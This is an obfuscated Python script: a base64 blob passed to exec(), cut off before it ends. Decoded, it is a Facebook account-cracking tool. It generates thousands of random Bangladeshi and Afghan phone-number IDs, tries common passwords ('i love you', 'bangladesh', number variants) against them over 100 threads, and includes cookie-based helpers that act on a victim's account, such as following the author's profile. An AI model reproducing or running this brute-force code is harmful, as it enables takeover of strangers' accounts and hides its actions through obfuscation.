import base64
exec(base64.b64decode("IyBGYWNlYm9vazogWmFoaWQgSG9zc2FpbiANCiMgR2l0aHViOiBCTEFDSyBIVU5URVIgVEVBTSANCmltcG9ydCBvcw0KaW1wb3J0IHN5cw0KaW1wb3J0IHRpbWUNCmltcG9ydCByZXF1ZXN0cw0KaW1wb3J0IHV1aWQNCm9zLnN5c3RlbSgncGtnIGluc3RhbGwgY3VybCcpDQpvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIGJzNCcpDQpvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJykNCg0KaW1wb3J0IG9zLHN5cyx0aW1lLGpzb24scmFuZG9tLHJlLHN0cmluZyxwbGF0Zm9ybSxiYXNlNjQsdXVpZA0Kb3Muc3lzdGVtKCJnaXQgcHVsbCIpDQpmcm9tIGJzNCBpbXBvcnQgQmVhdXRpZnVsU291cCBhcyBzb3ANCmZyb20gYnM0IGltcG9ydCBCZWF1dGlmdWxTb3VwDQppbXBvcnQgcmVxdWVzdHMgYXMgcmVzcw0KbWE0RDEgPSBvcGVuDQpmcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRlDQpmcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRldGltZQ0KZnJvbSB0aW1lIGltcG9ydCBzbGVlcA0KZnJvbSB0aW1lIGltcG9ydCBzbGVlcCBhcyB3YWt0dQ0KdHJ5Og0KICAgIGltcG9ydCByZXF1ZXN0cw0KICAgIGZyb20gY29uY3VycmVudC5mdXR1cmVzIGltcG9ydCBUaHJlYWRQb29sRXhlY3V0b3IgYXMgVGhyZWFkUG9vbA0KICAgIGltcG9ydCBtZWNoYW5pemUNCiAgICBmcm9tIHJlcXVlc3RzLmV4Y2VwdGlvbnMgaW1wb3J0IENvbm5lY3Rpb25FcnJvcg0KZXhjZXB0IE1vZHVsZU5vdEZvdW5kRXJyb3I6DQogICAgb3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBtZWNoYW5pemUgcmVxdWVzdHMgZnV0dXJlcyBiczQ9PTIgPiAvZGV2L251bGwnKQ0KICAgIG9zLnN5c3RlbSgncGlwIGluc3RhbGwgYnM0JykNCiAgICANCmRlZiBjZWtfYXBrKHNlc3Npb24sY29raSk6DQogICAgdz1zZXNzaW9uLmdldCgiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tL3NldHRpbmdzL2FwcHMvdGFiYmVkLz90YWI9YWN0aXZlIixjb29raWVzPXsiY29va2llIjpjb2tpfSkudGV4dA0KICAgIHNvcCA9IEJlYXV0aWZ1bFNvdXAodywiaHRtbC5wYXJzZXIiKQ0KICAgIHggPSBzb3AuZmluZCgiZm9ybSIsbWV0aG9kPSJwb3N0IikNCiAgICBnYW1lID0gW2kudGV4dCBmb3IgaSBpbiB4LmZpbmRfYWxsKCJoMyIpXQ0KICAgIGlmIGxlbihnYW1lKT09MDoNCiAgICAgICAgcHJpbnQoZidcciVzWyVzISVzXSAlc1NvcnJ5IHRoZXJlIGlzIG5vIEFjdGl2ZSAgQXBrJXMgICclKE4sTSxOLE0sTikpDQogICAgZWxzZToNCiAgICAgICAgcHJpbnQoZidcclvwn5G/XSAlcyBceDFiWzE7OTVtIBogWW91ciBBY3RpdmUgQXBwcyAaICAgICA6e1dISVRFfSclKEdSRUVOKSkNCiAgICAgICAgZm9yIGkgaW4gcmFuZ2UobGVuKGdhbWUpKToNCiAgICAgICAgICAgIHByaW50KGYiXHJbJXMlc10gJXMlcyIlKE4saSsxLGdhbWVbaV0ucmVwbGFjZSgiRGl0YW1iYWhrYW4gcGFkYSIsIiBEaXRhbWJhaGthbiBwYWRhIiksTikpDQogICAgICAgICNlbHNlOg0KICAgICAgICAgICAgI3ByaW50KGYnXHIgJXNbJXMhJXNdIFNvcnJ5LCBBcGsgY2hlY2sgZmFpbGVkIGludmFsaWQgY29va2llJyUoTixNLE4pKQ0KICAgIHc9c2Vzc2lvbi5nZXQoImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9zZXR0aW5ncy9hcHBzL3RhYmJlZC8/dGFiPWluYWN0aXZlIixjb29raWVzPXsiY29va2llIjpjb2tpfSkudGV4dA0KICAgIHNvcCA9IEJlYXV0aWZ1bFNvdXAodywiaHRtbC5wYXJzZXIiKQ0KICAgIHggPSBzb3AuZmluZCgiZm9ybSIsbWV0aG9kPSJwb3N0IikNCiAgICBnYW1lID0gW2kudGV4dCBmb3IgaSBpbiB4LmZpbmRfYWxsKCJoMyIpXQ0KICAgIGlmIGxlbihnYW1lKT09MDoNCiAgICAgICAgcHJpbnQoZidcciVzWyVzISVzXSAlc1NvcnJ5IHRoZXJlIGlzIG5vIEV4cGlyZWQgQXBrJXMgICAgICAgICAgIFxuJyUoTixNLE4sTSxOKSkNCiAgICBlbHNlOg0KICAgICAgICBwcmludChmJ1xyW/Cfkb9dICVzIFx4MWJbMTs5NW0gGiBZb3VyIEV4cGlyZWQgQXBwcyAaICAgIDp7V0hJVEV9JyUoTSkpDQogICAgICAgIGZvciBpIGluIHJhbmdlKGxlbihnYW1lKSk6DQogICAgICAgICAgICBwcmludChmIlxyWyVzJXNdICVzJXMiJShOLGkrMSxnYW1lW2ldLnJlcGxhY2UoIktlZGFsdXdhcnNhIiwiIEtlZGFsdXdhcnNhIiksTikpDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICBwcmludCgnJykNCg0KZGVmIGZvbGxvdyhzZWxmLCBzZXNzaW9uLCBjb2tpKToNCiAgICAgICAgciA9IEJlYXV0aWZ1bFNvdXAoc2Vzc2lvbi5nZXQoJ2h0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9wcm9maWxlLnBocD9pZD0xMDAwMDEyNDQ4NzE1ODknLCB7DQogICAgICAgICAgICAnY29va2llJzogY29raSB9LCAqKignY29va2llcycsKSkudGV4dCwgJ2h0bWwucGFyc2VyJykNCiAgICAgICAgZ2V0ID0gci5maW5kKCdhJywgJ0lrdXRpJywgKiooJ3N0cmluZycsKSkuZ2V0KCdocmVmJykNCiAgICAgICAgc2Vzc2lvbi5nZXQoJ2h0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbScgKyBzdHIoZ2V0KSwgew0KICAgICAgICAgICAgJ2Nvb2tpZSc6IGNva2kgfSwgKiooJ2Nvb2tpZXMnLCkpLnRleHQNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgDQoNCmNsYXNzIGphbGFuOg0KICAgIGRlZiBfX2luaXRfXyhzZWxmLCB6KToNCiAgICAgICAgZm9yIGUgaW4geiArICJcbiI6DQogICAgICAgICAgICBzeXMuc3Rkb3V0LndyaXRlKGUpDQogICAgICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCkNCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMC4wMDkpDQogICAgICAgICAgICANClAgPSAnXHgxYlsxOzk3bScNCk0gPSAnXHgxYlsxOzkxbScNCkggPSAnXHgxYlsxOzkybScNCksgPSAnXHgxYlsxOzkzbScNCkIgPSAnXHgxYlsxOzk0bScNClUgPSAnXHgxYlsxOzk1bScgDQpPID0gJ1x4MWJbMTs5Nm0nDQpOID0gJ1x4MWJbMG0nDQpNYWhkaV9IYXNhbiA9IHByaW50ICAgIA0KWiA9ICJcMDMzWzE7MzBtIg0Kc2lyID0gJ1wwMzNbNDFtXHgxYlsxOzk3bScNCnggPSAnXDMzW20nICMgREVGQVVMVA0KbSA9ICdceDFiWzE7OTFtJyAjUkVEICsNCmsgPSAnXDAzM1s5M20nICMgS1VOSU5HICsNCnhyID0gJ1x4MWJbMTs5Mm0nICMgSElKQVUgKw0KaGggPSAnXDAzM1szMm0nICMgSElKQVUgLQ0KdSA9ICdcMDMzWzk1bScgIyBVTkdVDQprayA9ICdcMDMzWzMzbScgIyBLVU5JTkcgLQ0KYiA9ICdcMzNbMTs5Nm0nICMgQklSVSAtDQpwID0gJ1x4MWJbMDszNG0nICMgQklSVSArDQphc3UgPSByYW5kb20uY2hvaWNlKFttLGsseHIsdSxiXSkNCm15X2NvbG9yID0gWw0KIFAsIE0sIEgsIEssIEIsIFUsIE8sIE5dDQp3YXJuYSA9IHJhbmRvbS5jaG9pY2UobXlfY29sb3IpDQpub3cgPSBkYXRldGltZS5ub3coKQ0KZHRfc3RyaW5nID0gbm93LnN0cmZ0aW1lKCIlSDolTSIpDQpjdXJyZW50ID0gZGF0ZXRpbWUubm93KCkNCnRhID0gY3VycmVudC55ZWFyDQpidSA9IGN1cnJlbnQubW9udGgNCmhhID0gY3VycmVudC5kYXkNCnRvZGF5ID0gZGF0ZS50b2RheSgpDQpvcy5zeXN0ZW0oJ3hkZy1vcGVuIGh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9ncm91cHMvMzY3NDQzNTcwMzY2NzA2Lz9yZWY9c2hhcmUnKQ0KDQpsb2dvID0iIiINClwwMzNbOTM7MW0gIF9fX18gICAgICAgIF8gICAgXyAgIF9fX19fX18gX19fX19fICAgICAgICAgIF9fICBfXyANClwwMzNbMTszMm0gfCAgXyBcICAgICAgfCB8ICB8IHwgfF9fICAgX198ICBfX19ffCAgIC9cICAgfCAgXC8gIHwNClwwMzNbOTE7MW0gfCB8XykgfF9fX19ffCB8X198IHwgICAgfCB8ICB8IHxfXyAgICAgLyAgXCAgfCBcICAvIHwNClwwMzNbOTU7MW0gfCAgXyA8X19fX19ffCAgX18gIHwgICAgfCB8ICB8ICBfX3wgICAvIC9cIFwgfCB8XC98IHwNClwwMzNbOTQ7MW0gfCB8XykgfCAgICAgfCB8ICB8IHwgICAgfCB8ICB8IHxfX19fIC8gX19fXyBcfCB8ICB8IHwNClwwMzNbOTM7MW0gfF9fX18vICAgICAgfF98ICB8X3wgICAgfF98ICB8X19fX19fL18vICAgIFxfXF98ICB8X3wgDQoNClwzM1sxOzMybT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0NClwwMzNbMTs5NW1bXDAzM1sxOzkzbVs+XVwwMzNbMTs5NW1dXDAzM1sxOzkzbSBBVVRIT1IgIFwwMzNbMTs5MW0gOiBcMDMzWzE7OTVtWkFISUQgSFVTU0FJTg0KXDAzM1sxOzk1bVtcMDMzWzE7OTNtWz5dXDAzM1sxOzk1bV1cMDMzWzE7OTNtIEZBQ0VCT09LXDAzM1sxOzkxbSA6IFwwMzNbMTs5NW1aQUhJRCBIVVNTQUlODQpcMDMzWzE7OTVtW1wwMzNbMTs5M21bPl1cMDMzWzE7OTVtXVwwMzNbMTs5M20gR0lUSFVCICBcMDMzWzE7OTFtIDogXDAzM1sxOzk1bUJMQUNLLUhVTlRFUi1URUFNDQpcMDMzWzE7OTVtW1wwMzNbMTs5M21bPl1cMDMzWzE7OTVtXVwwMzNbMTs5M20gVE9PTFMgICBcMDMzWzE7OTFtIDogXDAzM1sxOzk1bVJBTkRPTSBCRA0KXDAzM1sxOzk1bVtcMDMzWzE7OTNtWz5dXDAzM1sxOzk1bV1cMDMzWzE7OTNtIFZFUlNJT04gXDAzM1sxOzkxbSA6IFwwMzNbMTs5MW0xLjkuOA0KXDMzWzE7MzJtPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PSIiIg0KDQp0cnk6DQogICAga2V5MT1vcGVuKCIvc3RvcmFnZS9lbXVsYXRlZC8wL2FuZHJvaWQ4LnR4dCIsJ3InKS5yZWFkKCkNCmV4Y2VwdCBJT0Vycm9yOg0KICAgIGtvaz1vcGVuKCIvc3RvcmFnZS9lbXVsYXRlZC8wL2FuZHJvaWQ4LnR4dCIsJ3cnKQ0KICAgIG15aWQ9dXVpZC51dWlkNCgpLmhleFs6MTJdDQogICAgZj0iQ09CUkEtTElOVVgiDQogICAga2V5PW15aWQrZg0KICAgIGtvay53cml0ZShrZXkpDQogICAga29rLmNsb3NlKCkNCiAgICBwcmludChrZXkpDQoNCmE9cmVxdWVzdHMuZ2V0KCJodHRwczovL2dpdGh1Yi5jb20vamFoaWVkL0VDLTE3MC9ibG9iL21haW4vUmFuZG9tLUJkLnR4dCIpLnRleHQNCmI9c3RyKGEpDQprZXkxPW9wZW4oIi9zdG9yYWdlL2VtdWxhdGVkLzAvYW5kcm9pZDgudHh0IiwncicpLnJlYWQoKQ0Ka2V5Mj1zdHIoa2V5MSkgIA0KaWYga2V5MiBpbiBiOg0KICAgIHBhc3MNCiAgICANCmVsc2U6DQogICAgb3Muc3lzdGVtKCJjbGVhciIpDQogICAgcHJpbnQNCiAgICBwcmludCgiWW91ciBrZXkgIDogIitrZXkyKQ0KICAgIHByaW50KCJcblx0XHRDb250YWN0IEFkbWluICIpDQogICAgb3Muc3lzdGVtKCd4ZGctb3BlbiBodHRwczovL3dhLm1lLys4ODAxNzQ3OTUxMTY5JykNCiAgICBleGl0KCkNCmxvb3AgPSAwDQpva3MgPSBbXQ0KY3BzID0gW10NCg0KZGVmIGNsZWFyKCk6DQogICAgb3Muc3lzdGVtKCdjbGVhcicpDQogICAgTWFoZGlfSGFzYW4obG9nbykNCmZyb20gdGltZSBpbXBvcnQgbG9jYWx0aW1lIGFzIGx0DQpmcm9tIG9zIGltcG9ydCBzeXN0ZW0gYXMgY21kDQpsdHggPSBpbnQobHQoKVszXSkNCmlmIGx0eCA+IDEyOg0KICAgIGEgPSBsdHgtMTINCiAgICB0YWcgPSAiUE0iDQplbHNlOg0KICAgIGEgPSBsdHgNCiAgICB0YWcgPSAiQU0iDQogICAgDQogICAgDQp0cnk6DQogICAgTWFoZGlfSGFzYW4oJ1xuXG5cMDMzWzE7MzNtTG9hZGluZyBhc3NldCBmaWxlcyAuLi4gXDAzM1swOzk3bScpDQogICAgdiA9IDUuMg0KICAgIHVwZGF0ZSA9ICgnNS4yJykNCiAgICB1cGRhdGUgPSAoJzUuMicpDQogICAgaWYgc3RyKHYpIGluIHVwZGF0ZToNCiAgICAgICAgb3Muc3lzdGVtKCdjbGVhcicpDQogICAgZWxzZTpwYXNzDQpleGNlcHQ6TWFoZGlfSGFzYW4oJ1xuXDAzM1sxOzMxbU5vIGludGVybmV0IGNvbm5lY3Rpb24gLi4uIFwwMzNbMDs5N20nKQ0KI2dsb2JhbCBmdW5jdGlvbnMNCmRlZiBkeW5hbWljKHRleHQpOg0KICAgIHRpdGlrID0gWycuICAgJywnLi4gICcsJy4uLiAnLCcuLi4uICddDQogICAgZm9yIG8gaW4gdGl0aWs6DQogICAgICAgIE1haGRpX0hhc2FuKCdccicrdGV4dCtvKSwNCiAgICAgICAgc3lzLnN0ZG91dC5mbHVzaCgpO3RpbWUuc2xlZXAoMSkNCg0KI1VzZXIgYWdlbnRzDQp1Z2VuMj1bJ01vemlsbGEvNS4wIChMaW51eDsgVTsgQW5kcm9pZCA0LjI7IHJ1LXJ1OyBOb2tpYV9YIEJ1aWxkL0pEUTM5KSBBcHBsZVdlYktpdC81MzQuMzAgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMiBNb2JpbGUgU2FmYXJpL0U3RkJBRiddDQp1Z2VuPVtdDQoNCiANCmZvciB4ZCBpbiByYW5nZSgxMDAwMCk6DQogICAgbT0nTW96aWxsYS81LjAgKExpbnV4OyBVOyBBbmRyb2lkJw0KICAgIGE9cmFuZG9tLmNob2ljZShbJzMnLCc0JywnNScsJzYnLCc3JywnOCcsJzknLCcxMCcsJzExJywnMTInLCcxMycsJzE0JywnMTUnLCcxNicsJzE3J10pDQogICAgaD0nIGVuLXVzOyBHVC0nDQogICAgZD1yYW5kb20uY2hvaWNlKFsnQScsJ0InLCAnQycsICdEJywgJ0UnLCAnRicsICdHJywgJ0gnLCAnSScsICdKJywgJ0snLCAnTCcsICdNJywgJ04nLCAnTycsICdQJywgJ1EnLCAnUicsICdTJywgJ1QnLCAnVScsICdWJywgJ1cnLCAnWCcsICdZJywgJ1onXSkNCiAgICBpPXJhbmRvbS5yYW5kcmFuZ2UoMSwgOTk5KQ0KICAgIGg9cmFuZG9tLmNob2ljZShbJ0EnLCdCJywgJ0MnLCAnRCcsICdFJywgJ0YnLCAnRycsICdIJywgJ0knLCAnSicsICdLJywgJ0wnLCAnTScsICdOJywgJ08nLCAnUCcsICdRJywgJ1InLCAnUycsICdUJywgJ1UnLCAnVicsICdXJywgJ1gnLCAnWScsICdaJ10pDQogICAgYT0nQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLycNCiAgICBzPXJhbmRvbS5yYW5kcmFuZ2UoNzMsMTAwKQ0KICAgIGE9JzAnDQogICAgbj1yYW5kb20ucmFuZHJhbmdlKDQyMDAsNDkwMCkNCiAgICBzaHU9cmFuZG9tLnJhbmRyYW5nZSg0MCwxNTApDQogICAgdm89J01vYmlsZSBTYWZhcmkvNTM3LjM2Jw0KICAgIHVha3UyPShmJ3ttfSB7YX07IHtofXtkfXtpfXtofSkge2F9e3N9LnthfS57bn0ue3NodX0ge3ZvfScpDQogICAgdWdlbi5hcHBlbmQodWFrdTIpDQpkZWYgbWFoZGkoKToNCiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykNCiAgICBwcmludChsb2dvKQ0KICAgICNvcy5zeXN0ZW0oJ3hkZy1vcGVuIGh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9ST09ULk9GLkpBSElFRD9taWJleHRpZD1aYldLd0wnKQ0KICAgICNwcmludCAoJ1wwMzNbMTs5M21bMV0gQmFuZ2xhZGFzaGkgSUQnKQ0KICAgICNwcmludCAoJ1wwMzNbMTs5MW1bMl0gQWZnaGFuaXN0YW4gIElEJykNCiAgICAjTWhhc2FuID0gaW5wdXQoJ1wwMzNbMTswbVxuSU5QVVQ9PT0+JykNCiAgICBpZiBNaGFzYW4gaW5bJzEnXToNCiAgICAgICAgb3Muc3lzdGVtKCd4ZGctb3BlbiBodHRwczovL3d3dy5mYWNlYm9vay5jb20vUk9PVC5PRi5KQUhJRUQ/bWliZXh0aWQ9WmJXS3dMJykNCiAgICAgICAgbWFoZGlfYmQoKQ0KICAgIGlmIE1oYXNhbiBpblsnMiddOg0KICAgICAgICBtYWhkaV9hZmcoKQ0KICAgIGVsaWYgTWhhc2FuOg0KICAgICAgICBtYWhkaSgpICAgIA0KIyBBUEsgQ0hFQ0sNCg0KDQpkZWYgeHhyKCk6DQogICAgdXNlcj1bXQ0KICAgIHR3ZiA9W10NCiAgICBvcy5nZXR1aWQNCiAgICBvcy5nZXRldWlkDQogICAgb3Muc3lzdGVtKCJjbGVhciIpDQogICAgTWFoZGlfSGFzYW4obG9nbykNCiAgICBNYWhkaV9IYXNhbihmJyBbe3hyfV57eH1dIEV4YW1wbGU+OiB7eHJ9MDE5LDAxNywwMTgsMDE2LDAxNXt4fScpDQogICAgTWFoZGlfSGFzYW4oIiDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZAiKQ0KICAgIHJrMSA9ICcwMTYnDQogICAgcmsyID0gJzAxNycNCiAgICByazMgPSAnMDE4Jw0KICAgIHJrNCA9ICcwMTknDQogICAgcms1ID0gJzAxMycNCiAgICBjb2RlID0gcmFuZG9tLmNob2ljZShbcmsxLHJrMixyazMscms0XSkgICAgICAgICAgICAgICAgICAgICAgIyBpbnB1dChmJyBbe3hyfeKWoHt4fV0gQ2hvb3NlIDogJykNCiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykNCiAgICBNYWhkaV9IYXNhbihsb2dvKQ0KICAgIGxpbWl0ID0gaW50KGlucHV0KGYnXDAzM1swOzk3bVt7eHJ9Xnt4fV1cMDMzWzA7OTJtIEVYQU1QTEUgOiBcMDMzWzA7OTNtMTAwMDAsIFx4MWJbMzg7NTsyMDhtMjAwMDAsIFwwMzNbMDs5Mm01MDAwMCBdIFxuXDAzM1swOzk1beKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkCBcblwwMzNbMDs5N21be3hyfV57eH1dIFwwMzNbMDs5Mm1QVVQgQ0xPTklORyBMSU1JVDpcMDMzWzA7OTNtICcpKQ0KICAgIGZvciBubWJyIGluIHJhbmdlKGxpbWl0KToNCiAgICAgICAgbm1wID0gJycuam9pbihyYW5kb20uY2hvaWNlKHN0cmluZy5kaWdpdHMpIGZvciBfIGluIHJhbmdlKDgpKQ0KICAgICAgICB1c2VyLmFwcGVuZChubXApDQogICAgb3Muc3lzdGVtKCJjbGVhciIpDQogICAgTWFoZGlfSGFzYW4obG9nbykNCiAgICBwYXNzeCA9IDANCiAgICBIYW1paUlEID0gW10NCiAgICBNYWhkaV9IYXNhbigiIikNCiAgICBmb3IgYmlsYWwgaW4gcmFuZ2UocGFzc3gpOg0KICAgICAgICBwd3cgPSBpbnB1dChmIlsqXSBFbnRlciBQYXNzd29yZCB7YmlsYWwrMX0gOiAiKQ0KICAgICAgICBIYW1paUlELmFwcGVuZChwd3cpDQogICAgd2l0aCBUaHJlYWRQb29sKG1heF93b3JrZXJzPTEwMCkgYXMgbWFuc2hlcmE6DQogICAgICAgIGNsZWFyKCkNCiAgICAgICAgdGwgPSBzdHIobGVuKHVzZXIpKQ0KICAgICAgICBqYWxhbignXDAzM1sxOzk3bT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0nKQ0KICAgICAgICBqYWxhbihmJ1t7eHJ9Xnt4fV1ceDFiWzM4OzU7MjA4bSBZT1VSIFRPVEFMIElEUzoge3hyfScrdGwpDQogICAgICAgIGphbGFuKGYne3h9W3t4cn1ee3h9XVwwMzNbMDs5Mm0gUExFQVNFIFdBSVQgUFJPQ0VTUyBIQVMgQkVFTiBTVEFSVEVEJykNCiAgICAgICAgamFsYW4oZidcMDMzWzA7OTdtW3t4cn1ee3h9XVwwMzNbMDs5M20gVVNFIFdJLUZJICYgTU9CSUxFIERBVEEgJykNCiAgICAgICAgamFsYW4oZidcMDMzWzA7OTdtW3t4cn1ee3h9XSBceDFiWzM4OzU7MjA4bVVzZSBGbGlnaHQgTW9kZSBGb3IgU3BlZWQgVXAnKQ0KICAgICAgICBqYWxhbihmJ1wwMzNbMDs5N21be3hyfV57eH1dIFwwMzNbMDs5NW1TdXBlciBGYXN0IFNwZWVkIENsb25pbmcnKQ0KICAgICAgICBqYWxhbignXDAzM1sxOzk3bT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0nKQ0KICAgICAgICBmb3IgbG92ZSBpbiB1c2VyOg0KICAgICAgICAgICAgcHd4ID0gW2xvdmVbMTpdLGxvdmUsbG92ZVsyOl0sbG92ZStjb2RlLCdpIGxvdmUgeW91JywnbmFtZStjb2RlJywnYmFuZ2xhZGVzaCddDQogICAgICAgICAgICB1aWQgPSBjb2RlK2xvdmUNCiAgICAgICAgICAgIGZvciBTaHV2byBpbiBIYW1paUlEOg0KICAgICAgICAgICAgICAgIHB3eC5hcHBlbmQoU2h1dm8pDQogICAgICAgICAgICAgICAgcHd4LmFwcGVuZChsb3ZlKQ0KICAgICAgICAgICAgbWFuc2hlcmEuc3VibWl0KHJjcmFjayx1aWQscHd4LHRsKQ0KICAgIHByaW50KGYiXG57eH0g4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQIikNCg0KDQoNCmRlZiBtYWhkaV9hZmcoKToNCiAgICB1c2VyPVtdDQogICAgdHdmID1bXQ0KICAgIG9zLmdldHVpZA0KICAgIG9zLmdldGV1aWQNCiAgICBvcy5zeXN0ZW0oImNsZWFyIikNCiAgICBNYWhkaV9IYXNhbihsb2dvKQ0KICAgIE1haGRpX0hhc2FuKGYnIFt7eHJ9Xnt4fV0gRXhhbXBsZT46IHt4cn0wMTksMDE3LDAxOCwwMTYsMDE1LDAxM3t4fScpDQogICAgTWFoZGlfSGFzYW4oIiDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZAiKQ0KICAgIHJrMSA9ICcwMTcnDQogICAgcmsyID0gJzAxOScNCiAgICByazMgPSAnMDE4Jw0KICAgIHJrNCA9ICcwMTYnDQogICAgcms1ID0gJzAxMycNCiAgICBjb2RlID0gcmFuZG9tLmNob2ljZShbcmsxLHJrMixyazMscms0LHJrNV0pICAgICAgICAgICAgICAgICAgICAgICMgaW5wdXQoZicgW3t4cn3ilqB7eH1dIENob29zZSA6ICcpDQogICAgb3Muc3lzdGVtKCdjbGVhcicpDQogICAgTWFoZGlfSGFzYW4obG9nbykNCiAgICBsaW1pdCA9IGludChpbnB1dChmJ1wwMzNbMDs5N21be3hyfV57eH1dXDAzM1swOzkybSBFWEFNUExFIDogXDAzM1swOzkzbTEwMDAwLCBceDFiWzM4OzU7MjA4bTIwMDAwLCBcMDMzWzA7OTJtNTAwMDAgXSBcblwwMzNbMDs5NW3ilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZAgXG5cMDMzWzA7OTdtW3t4cn1ee3h9XSBcMDMzWzA7OTJtUFVUIENMT05JTkcgTElNSVQ6XDAzM1swOzkzbSAnKSkNCiAgICBmb3Igbm1iciBpbiByYW5nZShsaW1pdCk6DQogICAgICAgIG5tcCA9ICcnLmpvaW4ocmFuZG9tLmNob2ljZShzdHJpbmcuZGlnaXRzKSBmb3IgXyBpbiByYW5nZSg2KSkNCiAgICAgICAgdXNlci5hcHBlbmQobm1wKQ0KICAgIG9zLnN5c3RlbSgiY2xlYXIiKQ0KICAgIE1haGRpX0hhc2FuKGxvZ28pDQogICAgcGFzc3ggPSAwDQogICAgSGFtaWlJRCA9IFtdDQogICAgTWFoZGlfSGFzYW4oIiIpDQogICAgZm9yIGJpbGFsIGluIHJhbmdlKHBhc3N4KToNCiAgICAgICAgcHd3ID0gaW5wdXQoZiJbKl0gRW50ZXIgUGFzc3dvcmQge2JpbGFsKzF9IDogIikNCiAgICAgICAgSGFtaWlJRC5hcHBlbmQocHd3KQ0KICAgIHdpdGggVGhyZWFkUG9vbChtYXhfd29ya2Vycz0xMDApIGFzIG1hbnNoZXJhOg0KICAgICAgICBjbGVhcigpDQogICAgICAgIHRsID0gc3RyKGxlbih1c2VyKSkNCiAgICAgICAgamFsYW4oJ1wwMzNbMTs5N209PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09JykNCiAgICAgICAgamFsYW4oZidbe3hyfV57eH1dXHgxYlszODs1OzIwOG0gWU9VUiBUT1RBTCBJRFM6IHt4cn0nK3RsKQ0KICAgICAgICBqYWxhbihmJ3t4fVt7eHJ9Xnt4fV1cMDMzWzA7OTJtIFBMRUFTRSBXQUlUIFBST0NFU1MgSEFTIEJFRU4gU1RBUlRFRCcpDQogICAgICAgIGphbGFuKGYnXDAzM1swOzk3bVt7eHJ9Xnt4fV1cMDMzWzA7OTNtIFVTRSBXSS1GSSAmIE1PQklMRSBEQVRBICcpDQogICAgICAgIGphbGFuKGYnXDAzM1swOzk3bVt7eHJ9Xnt4fV0gXHgxYlszODs1OzIwOG1Vc2UgRmxpZ2h0IE1vZGUgRm9yIFNwZWVkIFVwJykNCiAgICAgICAgamFsYW4oZidcMDMzWzA7OTdtW3t4cn1ee3h9XSBcMDMzWzA7OTVtU3VwZXIgRmFzdCBTcGVlZCBDbG9uaW5nJykNCiAgICAgICAgamFsYW4oJ1wwMzNbMTs5N209PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09JykNCiAgICAgICAgZm9yIGxvdmUgaW4gdXNlcjoNCiAgICAgICAgICAgIHB3eCA9IFtsb3ZlWzE6XSxsb3ZlLGxvdmVbMjpdLGxvdmUrY29kZSwnbmFtZSsxMjM0JywnYmFuZ2xhZGVzaCcsJ0JhbmdsYWRlc2gnLCcxMDAyMDAnLCc1MDA2MDAnLCc4MDA5MDAnXQ0KICAgICAgICAgICAgdWlkID0gY29kZStsb3ZlDQogICAgICAgICAgICBmb3IgU2h1dm8gaW4gSGFtaWlJRDoNCiAgICAgICAgICAgICAgICBwd3guYXBwZW5kKFNodXZvKQ0KICAgICAgICAgICAgICAgIHB3eC5hcHBlbmQobG92ZSkNCiAgICAgICAgICAgIG1hbnNoZXJhLnN1Ym1pdChyY3JhY2ssdWlkLHB3eCx0bCkNCiAgICBwcmludChmIlxue3h9IOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkCIpICAgIA0KZGVmIHJjcmFjayh1aWQscHd4L